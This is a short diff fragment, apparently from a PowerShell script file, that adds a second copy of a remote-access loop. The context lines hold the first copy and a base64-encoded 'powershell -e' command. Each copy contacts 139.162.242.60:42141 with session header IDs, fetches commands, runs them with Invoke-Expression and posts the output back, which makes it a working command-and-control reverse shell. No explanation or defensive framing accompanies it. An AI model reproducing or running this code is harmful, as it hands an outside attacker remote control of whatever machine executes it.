@@ -7,3 +7,6 @@ powershell -e JAA3ADAAZABhAD0AJwAxADMAOQAuADEANgAyAC4AMgA0ADIALgA2ADAAOgA0ADIAMQ
 
 
 $691='139.162.242.60:42141';$4='cf9ff4f0-41811d42-9aed7716';$72b='http://';$51=Invoke-WebRequest -UseBasicParsing -Uri $72b$691/cf9ff4f0 -Headers @{"X-dc90-bfb9"=$4};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $72b$691/41811d42 -Headers @{"X-dc90-bfb9"=$4}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $72b$691/9aed7716 -Method POST -Headers @{"X-dc90-bfb9"=$4} -Body ($e+$r)} sleep 0.8}
+
+$9='139.162.242.60:42141';$e39='f209e1c5-86a0a808-50fd62a6';$0='http://';$b5847=Invoke-WebRequest -UseBasicParsing -Uri $0$9/f209e1c5 -Headers @{"X-613f-4560"=$e39};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $0$9/86a0a808 -Headers @{"X-613f-4560"=$e39}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $0$9/50fd62a6 -Method POST -Headers @{"X-613f-4560"=$e39} -Body ($e+$r)} sleep 0.8}
+
